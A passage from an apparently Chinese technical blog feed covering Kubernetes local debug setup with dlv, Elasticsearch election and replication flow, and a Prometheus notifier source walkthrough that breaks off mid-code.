class="meta">  $</span><span class="bash">&#123;APISERVER_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;CTLRMGR_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;CLOUD_CTLRMGR_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;PROXY_LOG:-&#125;</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;SCHEDULER_LOG:-&#125;</span></span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;" = true ]]; then</span><br><span class="line">  echo "  $&#123;APISERVER_BASIC_AUDIT_LOG&#125;"</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" == "all" ]]; then</span><br><span class="line">  echo "  $&#123;KUBELET_LOG&#125;"</span><br><span class="line">elif [[ "$&#123;START_MODE&#125;" == "nokubelet" ]]; then</span><br><span class="line">  echo</span><br><span class="line">  echo "No kubelet was started because you set START_MODE=nokubelet"</span><br><span class="line">  echo "Run this script again with START_MODE=kubeletonly to run a kubelet"</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  echo</span><br><span class="line">  if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">    echo "To start using your cluster, you can open up another terminal/tab and run:"</span><br><span class="line">  else</span><br><span class="line">    echo "To start using your cluster, run:"</span><br><span class="line">  fi</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">  export KUBECONFIG=$&#123;CERT_DIR&#125;/admin.kubeconfig</span><br><span class="line">  cluster/kubectl.sh</span><br><span class="line">Alternatively, you can write to the default kubeconfig:</span><br><span class="line">  export KUBERNETES_PROVIDER=local</span><br><span class="line">  cluster/kubectl.sh config set-cluster local --server=https://$&#123;API_HOST&#125;:$&#123;API_SECURE_PORT&#125; --certificate-authority=$&#123;ROOT_CA_FILE&#125;</span><br><span class="line">  cluster/kubectl.sh config set-credentials myself $&#123;AUTH_ARGS&#125;</span><br><span class="line">  cluster/kubectl.sh config set-context local --cluster=local --user=myself</span><br><span class="line">  cluster/kubectl.sh config use-context local</span><br><span class="line">  cluster/kubectl.sh</span><br><span class="line">EOF</span><br><span class="line">else</span><br><span class="line">  cat &lt;&lt;EOF</span><br><span class="line">The kubelet was started.</span><br><span class="line">Logs:</span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KUBELET_LOG&#125;</span></span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> If we are running <span class="keyword">in</span> the CI, we need a few more things before we can start</span></span><br><span class="line">if [[ "$&#123;KUBETEST_IN_DOCKER:-&#125;" == "true" ]]; then</span><br><span class="line">  echo "Preparing to test ..."</span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KUBE_ROOT&#125;/hack/install-etcd.sh</span></span><br><span class="line">  export PATH="$&#123;KUBE_ROOT&#125;/third_party/etcd:$&#123;PATH&#125;"</span><br><span class="line">  KUBE_FASTBUILD=true make ginkgo cross</span><br><span class="line">  apt install -y sudo</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> validate that etcd is: not running, <span class="keyword">in</span> path, and has minimum required version.</span></span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  kube::etcd::validate</span><br><span class="line">fi</span><br><span class="line">if [ "$&#123;CONTAINER_RUNTIME&#125;" == "docker" ] &amp;&amp; ! kube::util::ensure_docker_daemon_connectivity; then</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;CONTAINER_RUNTIME&#125;" == "rkt" ]]; then</span><br><span class="line">  test_rkt</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  test_apiserver_off</span><br><span class="line">fi</span><br><span class="line">kube::util::test_openssl_installed</span><br><span class="line">kube::util::ensure-cfssl</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## IF the user didn't supply an output/ for the build... Then we detect.</span></span></span><br><span class="line">if [ "$GO_OUT" == "" ]; then</span><br><span class="line">  detect_binary</span><br><span class="line">fi</span><br><span class="line">echo "Detected host and ready to start services.  Doing some housekeeping first..."</span><br><span class="line">echo "Using GO_OUT $GO_OUT"</span><br><span class="line">KUBELET_CIDFILE=/tmp/kubelet.cid</span><br><span class="line">if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">  trap cleanup EXIT</span><br><span class="line">fi</span><br><span class="line">echo "Starting services now!"</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "kubeletonly" ]]; then</span><br><span class="line">  start_etcd</span><br><span class="line">  set_service_accounts</span><br><span class="line">  start_apiserver</span><br><span class="line">  start_controller_manager</span><br><span class="line">  if [[ "$&#123;EXTERNAL_CLOUD_PROVIDER:-&#125;" == "true" ]]; then</span><br><span class="line">    start_cloud_controller_manager</span><br><span class="line">  fi</span><br><span class="line">  start_kubeproxy</span><br><span class="line">  start_kubedns</span><br><span class="line">  start_kubedashboard</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;START_MODE&#125;" != "nokubelet" ]]; then</span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="comment"># TODO remove this check if/when kubelet is supported on darwin</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Detect the OS name/arch and display appropriate error.</span></span><br><span class="line">    case "$(uname -s)" in</span><br><span class="line">      Darwin)</span><br><span class="line">        warning "kubelet is not currently supported in darwin, kubelet aborted."</span><br><span class="line">        KUBELET_LOG=""</span><br><span class="line">        ;;</span><br><span class="line">      Linux)</span><br><span class="line">        start_kubelet</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        warning "Unsupported host OS.  Must be Linux or Mac OS X, kubelet aborted."</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">fi</span><br><span class="line">if [[ -n "$&#123;PSP_ADMISSION&#125;" &amp;&amp; "$&#123;AUTHORIZATION_MODE&#125;" = *RBAC* ]]; then</span><br><span class="line">  create_psp_policy</span><br><span class="line">fi</span><br><span class="line">if [[ "$DEFAULT_STORAGE_CLASS" = "true" ]]; then</span><br><span class="line">  create_storage_class</span><br><span class="line">fi</span><br><span class="line">print_success</span><br><span class="line">if [[ "$&#123;ENABLE_DAEMON&#125;" = false ]]; then</span><br><span class="line">  while true; do sleep 1; done</span><br><span class="line">fi</span><br><span class="line">if [[ "$&#123;KUBETEST_IN_DOCKER:-&#125;" == "true" ]]; then</span><br><span class="line">  cluster/kubectl.sh config set-cluster local --server=https://localhost:6443 --certificate-authority=/var/run/kubernetes/server-ca.crt</span><br><span class="line">  cluster/kubectl.sh config set-credentials myself --client-key=/var/run/kubernetes/client-admin.key --client-certificate=/var/run/kubernetes/client-admin.crt</span><br><span class="line">  cluster/kubectl.sh config set-context local --cluster=local --user=myself</span><br><span class="line">  cluster/kubectl.sh config use-context local</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>执行过程中如果有kubelet启动失败的问题；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed to run Kubelet: failed to create kubelet: misconfiguration: kubelet c</span><br></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server02 ~]# docker info</span><br><span class="line">...</span><br><span class="line">Server Version: 1.13.1</span><br><span class="line">Storage Driver: overlay2</span><br><span class="line"> Backing Filesystem: xfs</span><br><span class="line"> Supports d_type: true</span><br><span class="line"> Native Overlay Diff: true</span><br><span class="line">Logging Driver: journald</span><br><span class="line">Cgroup Driver: systemd</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 修改docker.service</span></span><br><span class="line">vi /lib/systemd/system/docker.service</span><br><span class="line"></span><br><span class="line">找到</span><br><span class="line">--exec-opt native.cgroupdriver=systemd \</span><br><span class="line">修改为：</span><br><span class="line">--exec-opt native.cgroupdriver=cgroupfs \</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启docker</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改后查看docker Cgroup Driver</span></span><br><span class="line">[root@server03 sysconfig]# docker info</span><br><span class="line">...</span><br><span class="line">Server Version: 1.13.1</span><br><span class="line">Storage Driver: overlay2</span><br><span class="line"> Backing Filesystem: xfs</span><br><span class="line"> Supports d_type: true</span><br><span class="line"> Native Overlay Diff: true</span><br><span class="line">Logging Driver: journald</span><br><span class="line">Cgroup Driver: cgroupfs</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>继续：</p><p>单机集群：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一次执行下面的命令编译并启动集群</span></span><br><span class="line">./hack/local-up-cluster.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GOGCFLAGS="-N -l" WHAT="cmd/kube-apiserver" # 假设只编译kube-apiserver这一个模块，需要单独编译，这个命令不管用，不考虑了吧~~</span><br></pre></td></tr></table></figure><p>直接执行跳过编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hack/local-up-cluster.sh -O</span><br></pre></td></tr></table></figure><p>检查kube启动正常</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep kube|grep -v grep</span><br></pre></td></tr></table></figure><p>以apiserver为例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -15 5228</span><br><span class="line">dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /root/gopath/src/k8s.io/kubernetes/_output/bin/kube-apiserver -- --authorization-mode=Node,RBAC --runtime-config=settings.k8s.io/v1alpha1 --cloud-provider= --cloud-config= --v=3 --vmodule= --cert-dir=/var/run/kubernetes --client-ca-file=/var/run/kubernetes/client-ca.crt --service-account-key-file=/tmp/kube-serviceaccount.key --service-account-lookup=true --enable-admission-plugins=LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection --disable-admission-plugins= --admission-control-config-file= --bind-address=0.0.0.0 --secure-port=6443 --tls-cert-file=/var/run/kubernetes/serving-kube-apiserver.crt --tls-private-key-file=/var/run/kubernetes/serving-kube-apiserver.key --insecure-bind-address=127.0.0.1 --insecure-port=8080 --storage-backend=etcd3 --etcd-servers=http://127.0.0.1:2379 --service-cluster-ip-range=10.0.0.0/24 --feature-gates=AllAlpha=false --external-hostname=localhost --requestheader-username-headers=X-Remote-User --requestheader-group-headers=X-Remote-Group --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-client-ca-file=/var/run/kubernetes/request-header-ca.crt --requestheader-allowed-names=system:auth-proxy --proxy-client-cert-file=/var/run/kubernetes/client-auth-proxy.crt --proxy-client-key-file=/var/run/kubernetes/client-auth-proxy.key --cors-allowed-origins='/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$'</span><br></pre></td></tr></table></figure><p>执行apiserver</p><p>远程端口：39999</p><p> 防火墙放开：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=39999/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>远程调试坑：</p><p>如果要调试如kube-apiserver程序则需要重新编译增加编译参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -o _output/bin/kube-apiserver -gcflags="-N -l" cmd/kube-apiserver/apiserver.go</span><br></pre></td></tr></table></figure><p>否则无法监听</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export GO_OUT=/<span class="keyword">go</span>/src/k8s.io/kubernetes/_output/bin</span><br></pre></td></tr></table></figure><p>goland配置：</p><p>Run-&gt;edit configuration配置。</p><p><img src="C:%5CUsers%5Cxudong%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1567673734423.png" alt="1567673734423"></p><p>断点调试。</p><p>这样远程同步完代码就可以远程调试了。</p><p>开始源码分析之路~~。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;kubernetes-debug环境搭建&quot;&gt;&lt;a href=&quot;#kubernetes-debug环境搭建&quot; class=&quot;headerlink&quot; title=&quot;kubernetes debug环境搭建&quot;&gt;&lt;/a&gt;kubernetes debug环境搭建&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
      <category term="k8s" scheme="http://www.mydreamdll.xyz/categories/k8s/"/>
    
    
      <category term="k8s" scheme="http://www.mydreamdll.xyz/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>ES过程分析</title>
    <link href="http://www.mydreamdll.xyz/2020/02/26/es%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/02/26/es%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</id>
    <published>2020-02-26T12:51:46.449Z</published>
    <updated>2020-02-26T12:50:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ES过程分析"><a href="#ES过程分析" class="headerlink" title="ES过程分析"></a>ES过程分析</h2><h3 id="选主算法"><a href="#选主算法" class="headerlink" title="选主算法"></a>选主算法</h3><p>Bully算法</p><p>他假设所有节点都有一个唯一的ID，使用该ID对节点进行排序。任何时候的当前Leader都是集群的最高ID节点。ES通过推迟选举，知道当前的Master失效来解决这个问题，只要当前节点不挂掉，就不重新选主。但容易出现脑裂，为此，再通过得票人数过半来解决脑裂问题。</p><p>Paxos算法</p><h3 id="数据副本策略"><a href="#数据副本策略" class="headerlink" title="数据副本策略"></a>数据副本策略</h3><p>分片副本采用主从模式。多副本中存在一个主副本Primary和多个从副本Secondary。所有写入操作都写入到主副本，当主副本出错的时候，系统从其他的从副本中选择合适的副本作为新的副本。</p><p>数据写入流程：</p><p>1）写请求进入主副本节点，节点为该操作分配SN，使用该SN创建UpdateRequest结构。然后将该UpdateRequest插入自己的PrepareList</p><p>2）主副本节点将携带SN的UpdateRequest发往从副本节点，从节点收到后同样插入PrepareList，完成后给主副本节点回复一个ACK</p><p>3）一旦主副本节点收到所有从副本节点的相应，确定该数据已经被正确写入到所有的从副本节点，此时认为可以提交了，将此UpdateRequest放入到commited list， commited list向前移动。</p><p>4）主副本节点回复客户端更新成功完成。对每个prepare消息，主副本节点向从副本节点发送一个commit通知，告诉他们自己的commited point位置，从副本节点收到通知后根据指示移动commited point到相同的位置。</p><h3 id="基本读取模型"><a href="#基本读取模型" class="headerlink" title="基本读取模型"></a>基本读取模型</h3><p>1）读请求转发到相关分片。注意，因为大多数搜索都会发送到一个或者多个索引，通常需要从多个分片中读取。每个分片都保存这些数据的一部分。</p><p>2）从副本组中选择一个相关分片的活跃副本，它可以是主分片或副分片。默认情况下，ES会简单地循环遍历这些分片</p><p>3）发送分片级的读请求到被选中的副本</p><p>4）合并结果并给客户端返回响应，注意，针对通过ID查找的get请求，会跳过这个步骤，因为只有一个相关的分片。</p><h3 id="Index基本流程"><a href="#Index基本流程" class="headerlink" title="Index基本流程"></a>Index基本流程</h3><p>新建，索引和删除请求都是写操作。写操作必须先在主分片执行成功后才能复制到相关的副分片。写单个文档的流程。</p><p>1）客户端向NODE1发送写请求</p><p>2）NODE1使用文档ID来确定文档属于分片0，通过集群状态中的内容路由表信息来获知分片0的主分片位于NODE3，因此请求被转发到NODE3上</p><p>3）NODE3上的主分片执行写操作，如果写入成功，则它将请求并行转发到NODE1和NODE2的副分片上，等待返回结果。当所有的副分片都报告成功，NODE3将向协调节点报告成功，协调节点再想客户端报告成功。</p><p>quorum = int( (primary+number_of_replicas)/2)+1</p><h3 id="协调节点流程"><a href="#协调节点流程" class="headerlink" title="协调节点流程"></a>协调节点流程</h3><p>协调节点负责创建索引，转发请求到主分片节点，等待响应，回复客户端。</p><p>1）参数检查</p><p>2）处理pipeline请求</p><p>3）自动创建索引</p><p>4）对请求的预先处理</p><p>5）检测集群状态</p><p>6）内容路由，构建基于shared的请求</p><p>7）路由算法</p><p>8）转发请求并等待响应</p><h3 id="主分片节点流程"><a href="#主分片节点流程" class="headerlink" title="主分片节点流程"></a>主分片节点流程</h3><p>主节点所在节点负责在本地写主分片，写成功后，转发写副分片请求，等待响应，回复协调节点。</p><p>1）检查请求</p><p>2）是否延迟执行</p><p>3）判断主分片是否已经发生迁移</p><p>4）检查写一致性</p><p>5）写Lucene和事务日志</p><p>6）flush translog</p><p>7）写副分片</p><p>8）处理副分片写失败情况</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ES过程分析&quot;&gt;&lt;a href=&quot;#ES过程分析&quot; class=&quot;headerlink&quot; title=&quot;ES过程分析&quot;&gt;&lt;/a&gt;ES过程分析&lt;/h2&gt;&lt;h3 id=&quot;选主算法&quot;&gt;&lt;a href=&quot;#选主算法&quot; class=&quot;headerlink&quot; title=&quot;选
      
    
    </summary>
    
    
      <category term="ElasticSearch" scheme="http://www.mydreamdll.xyz/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://www.mydreamdll.xyz/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus 架构和源码学习</title>
    <link href="http://www.mydreamdll.xyz/2020/02/18/prometheus%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/"/>
    <id>http://www.mydreamdll.xyz/2020/02/18/prometheus%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-02-18T01:29:10.643Z</published>
    <updated>2020-02-18T01:29:10.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prometheus-架构和源码"><a href="#Prometheus-架构和源码" class="headerlink" title="Prometheus 架构和源码"></a>Prometheus 架构和源码</h1><h2 id="Prometheus架构"><a href="#Prometheus架构" class="headerlink" title="Prometheus架构"></a>Prometheus架构</h2><p><img src="http://www.aneasystone.com/usr/uploads/2018/10/4197609471.png" alt="architecture.png"></p><h2 id="构成部分"><a href="#构成部分" class="headerlink" title="构成部分"></a>构成部分</h2><p>prometheus源码分析（prometheus基于版本2.1.0和alertmanager版本0.8.0）：</p><ol><li>notifier</li><li>ruleManager</li><li>queryengine</li><li>web</li><li>discovermanager</li><li>scrapeManager</li><li>localstorage/remotestorage</li><li>alertManager</li><li>pushgateway</li></ol><p>各个组件的构成结构图：</p><p><img src="/images/1572413613743.png" alt="1572413613743"></p><h2 id="Notifier"><a href="#Notifier" class="headerlink" title="Notifier"></a>Notifier</h2><p>notifier 组件用于告警通知，在完成初始化后，notifier组件内部会构建一个告警通知队列，队列的大小由命令行参数–alertmanager.notification-queue-capacity确定，默认值为10000 ，且告警信息通过sendAlerts方法发送给AlertManager 。</p><p>初始化notifier组件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notifier               = notifier.New(&amp;cfg.notifier, log.With(logger, <span class="string">"component"</span>, <span class="string">"notifier"</span>))</span><br></pre></td></tr></table></figure><p>notifier将规则触发的告警信息AlertManagers服务组的过程，通知管理服务由发现AlertManager服务，注册notifier和notifier服务组成。</p><p>发现alertManager服务（discoveryManagerScrape）的逻辑与发现scrape服务（discoveryManagerNotify）的逻辑是一样的，</p><p>如果将alertmanager组件结合，那么服务发现的类型就是static_configs</p><p>初始化的过程中会完成对rulemanager和notifier组件的构造，同时notifier会通过sendAlerts向ruleManager回调注册。</p><p>启动notifier服务：</p><p>1.构建notifier结构实列</p><p>2.加载系统配置</p><p>3.启动notifier</p><p>notifier服务结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Notifier is responsible for dispatching alert notifications to an</span></span><br><span class="line"><span class="comment">// alert manager service.</span></span><br><span class="line"><span class="keyword">type</span> Notifier <span class="keyword">struct</span> &#123;</span><br><span class="line">queue []*Alert</span><br><span class="line">opts  *Options</span><br><span class="line"></span><br><span class="line">metrics *alertMetrics</span><br><span class="line"></span><br><span class="line">more   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">ctx    context.Context</span><br><span class="line">cancel <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">alertmanagers <span class="keyword">map</span>[<span class="keyword">string</span>]*alertmanagerSet</span><br><span class="line">logger        log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>notifier实列使用New方法来实现，处理逻辑：</p><ol><li>QueueCapacity的大小构建告警信息缓存队列，QueueCapacity的大小使用命令行启动参数–alertmanager.notification-queue-capacity指定</li><li>context协同控制notifier服务</li><li>注册notifier服务指标：告警缓存队列大小，告警信息长度，告警地址个书，丢弃的告警信息个数</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// New constructs a new Notifier.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(o *Options, logger log.Logger)</span> *<span class="title">Notifier</span></span> &#123;</span><br><span class="line">ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> o.Do == <span class="literal">nil</span> &#123;</span><br><span class="line">o.Do = ctxhttp.Do</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> logger == <span class="literal">nil</span> &#123;</span><br><span class="line">logger = log.NewNopLogger()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n := &amp;Notifier&#123;</span><br><span class="line">queue:  <span class="built_in">make</span>([]*Alert, <span class="number">0</span>, o.QueueCapacity),</span><br><span class="line">ctx:    ctx,</span><br><span class="line">cancel: cancel,</span><br><span class="line">more:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>),</span><br><span class="line">opts:   o,</span><br><span class="line">logger: logger,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">queueLenFunc := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">float64</span></span> &#123; <span class="keyword">return</span> <span class="keyword">float64</span>(n.queueLen()) &#125;</span><br><span class="line">alertmanagersDiscoveredFunc := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">float64</span></span> &#123; <span class="keyword">return</span> <span class="keyword">float64</span>(<span class="built_in">len</span>(n.Alertmanagers())) &#125;</span><br><span class="line"></span><br><span class="line">n.metrics = newAlertMetrics(</span><br><span class="line">o.Registerer,</span><br><span class="line">o.QueueCapacity,</span><br><span class="line">queueLenFunc,</span><br><span class="line">alertmanagersDiscoveredFunc,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newAlertMetrics是将notifier服务指标注册到prometheus系统的具体实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAlertMetrics</span><span class="params">(r prometheus.Registerer, queueCap <span class="keyword">int</span>, queueLen, alertmanagersDiscovered <span class="keyword">func</span>()</span> <span class="title">float64</span>) *<span class="title">alertMetrics</span></span> &#123;</span><br><span class="line">m := &amp;alertMetrics&#123;</span><br><span class="line">latency: prometheus.NewSummaryVec(prometheus.SummaryOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"latency_seconds"</span>,</span><br><span class="line">Help:      <span class="string">"Latency quantiles for sending alert notifications (not including dropped notifications)."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">errors: prometheus.NewCounterVec(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"errors_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of errors sending alert notifications."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">sent: prometheus.NewCounterVec(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"sent_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of alerts successfully sent."</span>,</span><br><span class="line">&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;alertmanagerLabel&#125;,</span><br><span class="line">),</span><br><span class="line">dropped: prometheus.NewCounter(prometheus.CounterOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"dropped_total"</span>,</span><br><span class="line">Help:      <span class="string">"Total number of alerts dropped due to errors when sending to Alertmanager."</span>,</span><br><span class="line">&#125;),</span><br><span class="line">queueLength: prometheus.NewGaugeFunc(prometheus.GaugeOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span class="string">"queue_length"</span>,</span><br><span class="line">Help:      <span class="string">"The number of alert notifications in the queue."</span>,</span><br><span class="line">&#125;, queueLen),</span><br><span class="line">queueCapacity: prometheus.NewGauge(prometheus.GaugeOpts&#123;</span><br><span class="line">Namespace: namespace,</span><br><span class="line">Subsystem: subsystem,</span><br><span class="line">Name:      <span 